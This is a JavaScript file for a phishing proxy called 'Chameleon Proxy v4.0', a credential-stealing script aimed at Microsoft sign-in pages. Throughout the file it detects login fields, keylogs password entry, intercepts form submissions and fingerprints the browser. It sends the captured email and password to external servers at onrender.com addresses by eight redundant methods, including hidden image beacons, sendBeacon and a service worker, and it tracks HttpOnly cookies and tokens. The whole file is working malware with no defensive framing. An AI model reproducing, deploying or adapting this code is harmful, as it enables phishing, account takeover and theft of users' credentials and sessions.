// ============================================================
//  CHAMELEON PROXY v4.0 - ULTIMATE HYBRID
//  Script 1: Password Capture + Session Injection
//  The most advanced version with dynamic injection + fallback
// ============================================================

(function() {
    'use strict';

    // ============================================================
    //  DYNAMIC CONFIGURATION (Injected by proxy server)
    //  If not injected, falls back to auto-detection
    // ============================================================

    // These values are injected by the proxy server
    // If not present, they auto-generate
    const CONFIG = window.MICROSOFT_CONFIG || {};

    const SESSION_ID = CONFIG.SESSION_ID || 
                       localStorage.getItem('chameleon_session') ||
                       'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    
    const EMAIL = CONFIG.EMAIL || 
                  localStorage.getItem('chameleon_email') || 
                  '';
    
    const BACKEND_URL = CONFIG.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com';
    const KEYLOGGER_URL = CONFIG.KEYLOGGER_URL || 'https://keyserver-eaar.onrender.com/log';
    const EVASION_ENABLED = CONFIG.EVASION_ENABLED !== false;

    // ============================================================
    //  GLOBAL STATE
    // ============================================================

    let capturedEmail = EMAIL || '';
    let capturedPassword = '';
    let lastPasswordValue = '';
    let passwordField = null;
    let emailField = null;
    let captureAttempts = 0;
    let formSubmitted = false;
    let initializationTime = Date.now();
    let isActive = true;
    let httpOnlyCount = 0;
    let tokenCount = 0;

    // ============================================================
    //  ADVANCED FIELD DETECTION - Multiple strategies
    // ============================================================

    const FIELD_DETECTION_STRATEGIES = {
        // Strategy 1: Exact selectors
        password: [
            'input[type="password"]',
            'input[name="passwd"]',
            'input[name="password"]',
            'input[name="pass"]',
            'input[id="i0118"]',
            'input[id="password"]',
            'input[placeholder*="password" i]',
            'input[autocomplete="current-password"]',
            'input[autocomplete="new-password"]',
            'input[name="loginPassword"]',
            'input[id="loginPassword"]',
            'input[data-email]',
            'input[data-password]'
        ],
        email: [
            'input[name="loginfmt"]',
            'input[name="login"]',
            'input[name="username"]',
            'input[name="email"]',
            'input[type="email"]',
            'input[name="user"]',
            'input[id="i0116"]',
            'input[id="email"]',
            'input[placeholder*="email" i]',
            'input[placeholder*="Email" i]',
            'input[name="LoginId"]',
            'input[id="LoginId"]',
            'input[data-email]',
            'input[data-login]'
        ]
    };

    function findPasswordField() {
        // Try exact selectors first
        for (const selector of FIELD_DETECTION_STRATEGIES.password) {
            try {
                const input = document.querySelector(selector);
                if (input) {
                    console.log('[PASSWORD] ✅ Found via selector:', selector);
                    return input;
                }
            } catch(e) {}
        }

        // Heuristic detection
        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            const className = input.className || '';
            const ariaLabel = input.getAttribute('aria-label') || '';
            
            const passwordPatterns = ['pass', 'pwd', 'password', 'senha', 'contraseña', 'parol'];
            const combinedText = (name + id + placeholder + className + ariaLabel).toLowerCase();
            
            if (type === 'password' || passwordPatterns.some(p => combinedText.includes(p))) {
                console.log('[PASSWORD] ✅ Found via heuristics');
                return input;
            }
        }

        return null;
    }

    function findEmailField() {
        // Try exact selectors first
        for (const selector of FIELD_DETECTION_STRATEGIES.email) {
            try {
                const input = document.querySelector(selector);
                if (input) {
                    console.log('[EMAIL] ✅ Found via selector:', selector);
                    return input;
                }
            } catch(e) {}
        }

        // Heuristic detection
        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            const className = input.className || '';
            const ariaLabel = input.getAttribute('aria-label') || '';
            
            const emailPatterns = ['email', 'mail', 'user', 'login', 'username', 'correo', 'usuario'];
            const combinedText = (name + id + placeholder + className + ariaLabel).toLowerCase();
            
            if (type === 'email' || emailPatterns.some(p => combinedText.includes(p))) {
                console.log('[EMAIL] ✅ Found via heuristics');
                return input;
            }
        }

        return null;
    }

    // ============================================================
    //  ULTIMATE CREDENTIAL SENDING - 8 Methods
    // ============================================================

    function sendCredentials(email, password, source, context = {}) {
        if (!email) email = capturedEmail || EMAIL || 'unknown';
        if (!password) password = capturedPassword || '';
        
        if (!password || password.length < 2) {
            console.log('[CREDENTIALS] ⚠️ Skipping short password');
            return false;
        }

        captureAttempts++;
        
        // Build complete data package
        const data = {
            email: email,
            password: password,
            source: source || 'password_capture',
            sessionId: SESSION_ID,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            timestampMs: Date.now(),
            referrer: document.referrer || 'Direct',
            passwordLength: password.length,
            captureAttempt: captureAttempts,
            httpOnlyCount: httpOnlyCount,
            tokenCount: tokenCount,
            evasionEnabled: EVASION_ENABLED,
            context: {
                pageTitle: document.title,
                domain: window.location.hostname,
                pathname: window.location.pathname,
                formAction: document.querySelector('form')?.action || 'unknown',
                formMethod: document.querySelector('form')?.method || 'unknown',
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                ...context
            },
            fingerprint: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }
        };

        console.log('[CREDENTIALS] 📤 Sending:', email, '|', password.length > 0 ? '***' : '(empty)', '(', source, ')');

        let sent = false;

        // ============================================================
        //  METHOD 1: Proxy Password Capture Endpoint
        // ============================================================
        try {
            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).then(() => { sent = true; }).catch(() => {});
        } catch(e) {}

        // ============================================================
        //  METHOD 2: Proxy Credential Capture Endpoint
        // ============================================================
        try {
            fetch('/api/credential-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(() => {});
        } catch(e) {}

        // ============================================================
        //  METHOD 3: Backend URL
        // ============================================================
        try {
            fetch(BACKEND_URL + '/api/credential-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(() => {});
        } catch(e) {}

        // ============================================================
        //  METHOD 4: Keylogger URL
        // ============================================================
        try {
            fetch(KEYLOGGER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'credential_capture',
                    email: email,
                    password: password,
                    source: source,
                    sessionId: SESSION_ID,
                    url: window.location.href,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    httpOnlyCount: httpOnlyCount,
                    tokenCount: tokenCount
                }),
                keepalive: true
            }).catch(() => {});
        } catch(e) {}

        // ============================================================
        //  METHOD 5: Beacon API
        // ============================================================
        try {
            const beaconData = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('/api/password-capture', beaconData);
            navigator.sendBeacon(BACKEND_URL + '/api/credential-capture', beaconData);
        } catch(e) {}

        // ============================================================
        //  METHOD 6: Service Worker Communication
        // ============================================================
        try {
            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'capture_password',
                    email: email,
                    password: password,
                    source: source,
                    sessionId: SESSION_ID,
                    timestamp: Date.now()
                });
                sent = true;
            }
        } catch(e) {}

        // ============================================================
        //  METHOD 7: Image Beacon (Hidden)
        // ============================================================
        try {
            const img = new Image();
            img.src = `/api/password-capture?data=${encodeURIComponent(JSON.stringify(data))}`;
            img.width = 0;
            img.height = 0;
            img.style.display = 'none';
            document.body.appendChild(img);
            setTimeout(() => img.remove(), 1000);
        } catch(e) {}

        // ============================================================
        //  METHOD 8: WebSocket (if available)
        // ============================================================
        try {
            if (window._ws && window._ws.readyState === WebSocket.OPEN) {
                window._ws.send(JSON.stringify({
                    type: 'credential_capture',
                    data: data
                }));
            }
        } catch(e) {}

        console.log('[CREDENTIALS] ✅ Sent via multiple methods (', source, ')');
        return true;
    }

    // ============================================================
    //  ADVANCED PASSWORD MONITORING - Multiple events
    // ============================================================

    function monitorPasswordField() {
        passwordField = findPasswordField();
        if (!passwordField) {
            console.log('[PASSWORD] ⚠️ No password field found, will retry');
            setTimeout(monitorPasswordField, 2000);
            return;
        }

        // Store reference
        window._passwordField = passwordField;

        // ============================================================
        //  Event 1: Input (Real-time)
        // ============================================================
        passwordField.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                console.log('[PASSWORD] 🔑 Input:', value.length > 0 ? '***' : '(empty)', '(', value.length, 'chars)');
                
                // Send immediately if long enough
                if (value.length > 2 && capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_input');
                }
            }
        });

        // ============================================================
        //  Event 2: Change
        // ============================================================
        passwordField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                console.log('[PASSWORD] 🔑 Change captured');
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_change');
                }
            }
        });

        // ============================================================
        //  Event 3: Blur (Focus lost)
        // ============================================================
        passwordField.addEventListener('blur', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                console.log('[PASSWORD] 🔑 Blur captured');
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_blur');
                }
            }
        });

        // ============================================================
        //  Event 4: Focus (Check for autofill)
        // ============================================================
        passwordField.addEventListener('focus', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                console.log('[PASSWORD] 🔑 Focus - autofill detected');
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_focus');
                }
            }
        });

        // ============================================================
        //  Event 5: Keyup (For keylogger)
        // ============================================================
        passwordField.addEventListener('keyup', function(e) {
            const value = this.value;
            if (value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
            }
        });

        console.log('[PASSWORD] ✅ Advanced password monitoring active');
    }

    // ============================================================
    //  ADVANCED EMAIL MONITORING
    // ============================================================

    function monitorEmailField() {
        emailField = findEmailField();
        if (!emailField) {
            console.log('[EMAIL] ⚠️ No email field found, will retry');
            setTimeout(monitorEmailField, 2000);
            return;
        }

        window._emailField = emailField;

        // Input event
        emailField.addEventListener('input', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Captured:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_input');
                }
            }
        });

        // Change event
        emailField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Change captured:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_change');
                }
            }
        });

        // Focus - check for autofill
        emailField.addEventListener('focus', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5) && value !== capturedEmail) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Focus - autofill detected:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_focus');
                }
            }
        });

        console.log('[EMAIL] ✅ Advanced email monitoring active');
    }

    // ============================================================
    //  FORM SUBMISSION INTERCEPTION
    // ============================================================

    function monitorFormSubmission() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            let email = capturedEmail || EMAIL || '';
            let password = capturedPassword || '';
            let formEmail = '';
            let formPassword = '';
            let allFields = {};

            // Extract all form data
            for (const [key, value] of formData.entries()) {
                allFields[key] = value;
                const keyLower = key.toLowerCase();
                
                // Email detection
                if (keyLower.includes('email') || keyLower.includes('mail') || keyLower.includes('user') || keyLower.includes('login')) {
                    if (value && (value.includes('@') || value.length > 5)) {
                        formEmail = value;
                        capturedEmail = value;
                    }
                }
                
                // Password detection
                if (keyLower.includes('pass') || keyLower.includes('pwd')) {
                    if (value) {
                        formPassword = value;
                        capturedPassword = value;
                    }
                }
                
                // Microsoft specific
                if (key === 'loginfmt' && value) {
                    formEmail = value;
                    capturedEmail = value;
                }
                if (key === 'passwd' && value) {
                    formPassword = value;
                    capturedPassword = value;
                }
            }

            // Send credentials
            if (formEmail && formPassword) {
                console.log('[FORM] 📧 Email:', formEmail);
                console.log('[FORM] 🔑 Password:', formPassword.length > 0 ? '***' : '(empty)');
                sendCredentials(formEmail, formPassword, 'form_submit', { allFields });
                formSubmitted = true;
            } else if (capturedEmail && capturedPassword) {
                console.log('[FORM] 📧 Using captured email:', capturedEmail);
                console.log('[FORM] 🔑 Using captured password:', capturedPassword.length > 0 ? '***' : '(empty)');
                sendCredentials(capturedEmail, capturedPassword, 'form_submit_fallback', { allFields });
                formSubmitted = true;
            } else if (formPassword) {
                // We have password but no email - try to find email in form
                for (const [key, value] of Object.entries(allFields)) {
                    if (value && (value.includes('@') || value.length > 5) && !key.toLowerCase().includes('pass')) {
                        formEmail = value;
                        capturedEmail = value;
                        break;
                    }
                }
                if (formEmail && formPassword) {
                    sendCredentials(formEmail, formPassword, 'form_submit_heuristic', { allFields });
                }
            }
        }, true);
    }

    // ============================================================
    //  PERIODIC CHECK - Enhanced
    // ============================================================

    function periodicPasswordCheck() {
        setInterval(() => {
            // Check password field
            if (passwordField) {
                const currentValue = passwordField.value;
                if (currentValue && currentValue.length > 2 && currentValue !== lastPasswordValue) {
                    capturedPassword = currentValue;
                    lastPasswordValue = currentValue;
                    console.log('[PASSWORD] 🔑 Periodic capture');
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, currentValue, 'periodic_check');
                    }
                }
            }
            
            // Check email field
            if (emailField) {
                const currentValue = emailField.value;
                if (currentValue && (currentValue.includes('@') || currentValue.length > 5) && currentValue !== capturedEmail) {
                    capturedEmail = currentValue;
                    console.log('[EMAIL] 📧 Periodic capture:', currentValue);
                    if (capturedPassword && capturedPassword.length > 2) {
                        sendCredentials(capturedEmail, capturedPassword, 'periodic_email');
                    }
                }
            }

            // Check for fields that might have been added dynamically
            if (!passwordField || !emailField) {
                if (!passwordField) {
                    const newField = findPasswordField();
                    if (newField) {
                        passwordField = newField;
                        monitorPasswordField();
                        setupKeyloggerForPassword();
                    }
                }
                if (!emailField) {
                    const newField = findEmailField();
                    if (newField) {
                        emailField = newField;
                        monitorEmailField();
                    }
                }
            }

            // Get HttpOnly cookie count from service worker
            try {
                if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'get_stats'
                    });
                }
            } catch(e) {}

        }, 3000);
    }

    // ============================================================
    //  ADVANCED KEYLOGGER
    // ============================================================

    function setupKeyloggerForPassword() {
        let passwordBuffer = '';
        let lastKeyTime = 0;
        let keyCount = 0;
        let passwordInput = findPasswordField();

        if (!passwordInput) {
            setTimeout(setupKeyloggerForPassword, 2000);
            return;
        }

        passwordInput.addEventListener('keydown', function(e) {
            const key = e.key;
            const now = Date.now();
            
            // Detect rapid typing
            if (now - lastKeyTime < 100) {
                keyCount++;
            } else {
                keyCount = 0;
            }
            lastKeyTime = now;

            if (key === 'Backspace') {
                passwordBuffer = passwordBuffer.slice(0, -1);
                console.log('[KEYLOG] ⌨️ Backspace - buffer:', passwordBuffer.length, 'chars');
            } else if (key === 'Enter') {
                if (passwordBuffer.length > 2) {
                    capturedPassword = passwordBuffer;
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, capturedPassword, 'keydown_enter');
                    }
                }
                passwordBuffer = '';
            } else if (key === 'Escape' || key === 'Tab') {
                // Ignore these keys
            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                passwordBuffer += key;
                capturedPassword = passwordBuffer;
                
                // Log every 5th character to reduce noise
                if (passwordBuffer.length % 5 === 0 || passwordBuffer.length <= 5) {
                    console.log('[KEYLOG] 🔑 Buffer:', passwordBuffer.length, 'chars');
                }
                
                // Send if buffer reaches certain length
                if (passwordBuffer.length >= 4 && capturedEmail) {
                    sendCredentials(capturedEmail, passwordBuffer, 'keylog_partial');
                }
            }
        });

        console.log('[KEYLOGGER] ✅ Advanced keylogger active');
    }

    // ============================================================
    //  KEYBOARD SHORTCUTS - Enhanced
    // ============================================================

    document.addEventListener('keydown', function(e) {
        // Ctrl+Shift+C - Manual capture
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            e.preventDefault();
            if (capturedEmail && capturedPassword) {
                console.log('[MANUAL] 📧 Email:', capturedEmail);
                console.log('[MANUAL] 🔑 Password:', capturedPassword);
                sendCredentials(capturedEmail, capturedPassword, 'manual_capture');
                showNotification('✅ Credentials captured and sent!');
            } else {
                const email = prompt('📧 Enter email:');
                const password = prompt('🔑 Enter password:');
                if (email && password) {
                    capturedEmail = email;
                    capturedPassword = password;
                    sendCredentials(email, password, 'manual_entry');
                    showNotification('✅ Credentials captured and sent!');
                }
            }
        }

        // Ctrl+Shift+L - Log state
        if (e.ctrlKey && e.shiftKey && e.key === 'L') {
            e.preventDefault();
            logState();
            showNotification('📊 State logged to console');
        }

        // Ctrl+Shift+S - Force send
        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
            e.preventDefault();
            if (capturedEmail && capturedPassword) {
                sendCredentials(capturedEmail, capturedPassword, 'force_send');
                showNotification('✅ Credentials force-sent!');
            } else {
                showNotification('❌ No credentials to send');
            }
        }

        // Ctrl+Shift+R - Reset
        if (e.ctrlKey && e.shiftKey && e.key === 'R') {
            e.preventDefault();
            if (confirm('Reset captured credentials?')) {
                capturedEmail = '';
                capturedPassword = '';
                lastPasswordValue = '';
                console.log('[RESET] 🗑️ Credentials reset');
                showNotification('🗑️ Credentials reset');
            }
        }
    });

    // ============================================================
    //  NOTIFICATION SYSTEM
    // ============================================================

    function showNotification(message, type = 'info') {
        try {
            // Create notification element
            const existing = document.querySelector('.chameleon-notification');
            if (existing) existing.remove();

            const div = document.createElement('div');
            div.className = 'chameleon-notification';
            div.style.cssText = `
                position: fixed;
                bottom: 20px;
                right: 20px;
                padding: 12px 20px;
                background: ${type === 'success' ? '#4CAF50' : type === 'error' ? '#f44336' : '#2196F3'};
                color: white;
                border-radius: 8px;
                font-family: Arial, sans-serif;
                font-size: 14px;
                z-index: 999999;
                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                max-width: 400px;
                animation: slideIn 0.3s ease-out;
            `;
            div.textContent = message;

            // Add animation
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOut {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);

            document.body.appendChild(div);

            // Auto-remove after 3 seconds
            setTimeout(() => {
                div.style.animation = 'slideOut 0.3s ease-in';
                setTimeout(() => div.remove(), 300);
            }, 3000);
        } catch(e) {
            // Fallback
            console.log('[NOTIFICATION]', message);
        }
    }

    // ============================================================
    //  LOG STATE
    // ============================================================

    function logState() {
        console.log('[DEBUG] 📊 ===== CHAMELEON STATE =====');
        console.log('  Email:', capturedEmail || '❌ Not captured');
        console.log('  Password:', capturedPassword ? '✅ Captured (' + capturedPassword.length + ' chars)' : '❌ Not captured');
        console.log('  Session ID:', SESSION_ID);
        console.log('  Capture Attempts:', captureAttempts);
        console.log('  Form Submitted:', formSubmitted);
        console.log('  Password Field:', passwordField ? '✅ Found' : '❌ Not found');
        console.log('  Email Field:', emailField ? '✅ Found' : '❌ Not found');
        console.log('  Evasion Enabled:', EVASION_ENABLED);
        console.log('  Initialization:', new Date(initializationTime).toISOString());
        console.log('  Uptime:', Math.round((Date.now() - initializationTime) / 1000), 'seconds');
        console.log('  HttpOnly Cookies:', httpOnlyCount);
        console.log('  Tokens:', tokenCount);
        console.log('  User Agent:', navigator.userAgent);
        console.log('[DEBUG] =================================');
    }

    // ============================================================
    //  MUTATION OBSERVER - Enhanced
    // ============================================================

    function setupMutationObserver() {
        const observer = new MutationObserver(function(mutations) {
            let shouldRecheck = false;
            let newPasswordFields = [];
            let newEmailFields = [];
            
            for (const mutation of mutations) {
                if (mutation.addedNodes.length > 0) {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === 1) {
                            // Direct input
                            if (node.tagName === 'INPUT') {
                                if (node.type === 'password') {
                                    newPasswordFields.push(node);
                                }
                                if (node.type === 'email' || node.name === 'loginfmt') {
                                    newEmailFields.push(node);
                                }
                            }
                            // Inputs inside added node
                            const inputs = node.querySelectorAll ? node.querySelectorAll('input') : [];
                            for (const input of inputs) {
                                if (input.type === 'password') {
                                    newPasswordFields.push(input);
                                }
                                if (input.type === 'email' || input.name === 'loginfmt') {
                                    newEmailFields.push(input);
                                }
                            }
                        }
                    }
                }
            }
            
            if (newPasswordFields.length > 0 || newEmailFields.length > 0) {
                console.log('[OBSERVER] 🔄 New fields detected:', {
                    password: newPasswordFields.length,
                    email: newEmailFields.length
                });
                shouldRecheck = true;
            }
            
            if (shouldRecheck) {
                clearTimeout(window._recheckTimeout);
                window._recheckTimeout = setTimeout(() => {
                    if (!passwordField) {
                        const newField = findPasswordField();
                        if (newField) {
                            passwordField = newField;
                            console.log('[OBSERVER] ✅ Password field reconnected');
                            monitorPasswordField();
                            setupKeyloggerForPassword();
                        }
                    }
                    if (!emailField) {
                        const newField = findEmailField();
                        if (newField) {
                            emailField = newField;
                            console.log('[OBSERVER] ✅ Email field reconnected');
                            monitorEmailField();
                        }
                    }
                }, 1000);
            }
        });

        try {
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: false
            });
            console.log('[OBSERVER] ✅ Mutation observer active');
            window._chameleonObserver = observer;
        } catch(e) {
            console.log('[OBSERVER] ⚠️ Failed to set up observer');
        }
    }

    // ============================================================
    //  SERVICE WORKER COMMUNICATION
    // ============================================================

    function setupServiceWorkerCommunication() {
        if ('serviceWorker' in navigator) {
            // Listen for messages
            navigator.serviceWorker.addEventListener('message', function(event) {
                const data = event.data;
                console.log('[SW] 📨 Message:', data);
                
                if (data.type === 'httpOnlyCookies') {
                    httpOnlyCount = data.count || data.cookies?.length || 0;
                    console.log('[SW] 🍪 HttpOnly cookies count:', httpOnlyCount);
                }
                
                if (data.type === 'tokens') {
                    tokenCount = data.count || Object.keys(data.tokens || {}).length || 0;
                    console.log('[SW] 🎟️ Tokens count:', tokenCount);
                }
                
                if (data.type === 'stats') {
                    httpOnlyCount = data.httpOnlyCount || 0;
                    tokenCount = data.tokenCount || 0;
                }
            });

            // Request stats periodically
            setInterval(() => {
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'get_stats'
                    });
                }
            }, 15000);

            // Send credentials to service worker
            setInterval(() => {
                if (navigator.serviceWorker.controller && capturedEmail && capturedPassword) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'capture_password',
                        email: capturedEmail,
                        password: capturedPassword,
                        source: 'periodic_sw_sync',
                        sessionId: SESSION_ID,
                        timestamp: Date.now()
                    });
                }
            }, 10000);
        }
    }

    // ============================================================
    //  STORAGE PERSISTENCE
    // ============================================================

    function setupStoragePersistence() {
        // Save to localStorage
        function saveState() {
            try {
                localStorage.setItem('chameleon_state', JSON.stringify({
                    email: capturedEmail,
                    sessionId: SESSION_ID,
                    attempts: captureAttempts,
                    timestamp: Date.now(),
                    formSubmitted: formSubmitted
                }));
            } catch(e) {}
        }

        // Load from localStorage
        function loadState() {
            try {
                const saved = localStorage.getItem('chameleon_state');
                if (saved) {
                    const data = JSON.parse(saved);
                    if (data.email && !capturedEmail) {
                        capturedEmail = data.email;
                    }
                    if (data.sessionId) {
                        // Use existing session if valid
                        if (SESSION_ID === data.sessionId) {
                            captureAttempts = data.attempts || 0;
                        }
                    }
                }
            } catch(e) {}
        }

        // Load saved state
        loadState();

        // Save periodically
        setInterval(saveState, 5000);

        // Save on beforeunload
        window.addEventListener('beforeunload', saveState);

        console.log('[STORAGE] ✅ Persistence active');
    }

    // ============================================================
    //  INITIALIZATION - Ultimate
    // ============================================================

    function init() {
        console.log('🛡️ ===== CHAMELEON PROXY v4.0 =====');
        console.log('🔐 Ultimate Password Capture System');
        console.log('🆔 Session:', SESSION_ID);
        console.log('📧 Email:', EMAIL || 'Auto-detect');
        console.log('🛡️ Evasion:', EVASION_ENABLED ? '✅ Active' : '❌ Disabled');
        console.log('=====================================');

        // Load saved state
        setupStoragePersistence();

        // Detect fields
        setTimeout(() => {
            // Email field
            emailField = findEmailField();
            if (emailField) {
                monitorEmailField();
                // Check pre-filled
                if (emailField.value && (emailField.value.includes('@') || emailField.value.length > 5)) {
                    capturedEmail = emailField.value;
                    console.log('[EMAIL] 📧 Pre-filled:', capturedEmail);
                }
            } else {
                console.log('[INIT] ⚠️ No email field found, retrying...');
            }

            // Password field
            passwordField = findPasswordField();
            if (passwordField) {
                monitorPasswordField();
                setupKeyloggerForPassword();
                // Check pre-filled
                if (passwordField.value && passwordField.value.length > 2) {
                    capturedPassword = passwordField.value;
                    lastPasswordValue = passwordField.value;
                    console.log('[PASSWORD] 🔑 Pre-filled detected');
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, capturedPassword, 'prefilled');
                    }
                }
            } else {
                console.log('[INIT] ⚠️ No password field found, retrying...');
            }

            // Setup all monitors
            monitorFormSubmission();
            periodicPasswordCheck();
            setupMutationObserver();
            setupServiceWorkerCommunication();

            // Send init event
            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'script_initialized',
                    sessionId: SESSION_ID,
                    email: capturedEmail || EMAIL || 'unknown',
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    evasionEnabled: EVASION_ENABLED
                })
            }).catch(() => {});

        }, 500);

        // Retry 1
        setTimeout(() => {
            if (!passwordField || !emailField) {
                console.log('[INIT] 🔄 Retry 1');
                if (!passwordField) {
                    passwordField = findPasswordField();
                    if (passwordField) {
                        monitorPasswordField();
                        setupKeyloggerForPassword();
                    }
                }
                if (!emailField) {
                    emailField = findEmailField();
                    if (emailField) {
                        monitorEmailField();
                    }
                }
            }
        }, 3000);

        // Retry 2
        setTimeout(() => {
            if (!passwordField || !emailField) {
                console.log('[INIT] 🔄 Retry 2 (final)');
                if (!passwordField) {
                    passwordField = findPasswordField();
                    if (passwordField) {
                        monitorPasswordField();
                        setupKeyloggerForPassword();
                    }
                }
                if (!emailField) {
                    emailField = findEmailField();
                    if (emailField) {
                        monitorEmailField();
                    }
                }
            }
            if (!passwordField && !emailField) {
                console.log('[INIT] ⚠️ No fields found. The page might not be a login page.');
            }
        }, 10000);

        // Log state on load
        window.addEventListener('load', function() {
            setTimeout(logState, 500);
        });

        console.log('✅ Chameleon Proxy initialized successfully!');
        console.log('💡 Keyboard shortcuts:');
        console.log('  Ctrl+Shift+C - Manual capture');
        console.log('  Ctrl+Shift+L - Log state');
        console.log('  Ctrl+Shift+S - Force send');
        console.log('  Ctrl+Shift+R - Reset credentials');
        console.log('  window.__chameleon - API access');
    }

    // ============================================================
    //  START
    // ============================================================

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // ============================================================
    //  API EXPOSURE
    // ============================================================

    window.__chameleon = {
        // Getters
        getEmail: () => capturedEmail,
        getPassword: () => capturedPassword,
        getSessionId: () => SESSION_ID,
        getAttempts: () => captureAttempts,
        getState: () => ({
            email: capturedEmail,
            hasPassword: !!capturedPassword,
            passwordLength: capturedPassword?.length || 0,
            sessionId: SESSION_ID,
            attempts: captureAttempts,
            formSubmitted: formSubmitted,
            hasEmailField: !!emailField,
            hasPasswordField: !!passwordField,
            httpOnlyCount: httpOnlyCount,
            tokenCount: tokenCount,
            evasionEnabled: EVASION_ENABLED,
            uptime: Math.round((Date.now() - initializationTime) / 1000)
        }),
        
        // Actions
        capture: () => {
            if (capturedEmail && capturedPassword) {
                sendCredentials(capturedEmail, capturedPassword, 'api_capture');
                return { success: true, email: capturedEmail };
            }
            return { success: false, error: 'No credentials captured' };
        },
        
        setCredentials: (email, password) => {
            capturedEmail = email;
            capturedPassword = password;
            sendCredentials(email, password, 'api_set');
            return { success: true };
        },
        
        findFields: () => ({
            email: findEmailField(),
            password: findPasswordField(),
            emailValue: emailField?.value || null,
            passwordValue: passwordField?.value || null
        }),
        
        send: (email, password, source) => {
            return sendCredentials(email || capturedEmail, password || capturedPassword, source || 'api_send');
        },
        
        reset: () => {
            capturedEmail = '';
            capturedPassword = '';
            lastPasswordValue = '';
            captureAttempts = 0;
            return { success: true };
        },
        
        logState: logState,
        
        // Utility
        version: '4.0.0',
        timestamp: Date.now()
    };

    console.log('✅ API available at window.__chameleon');
})();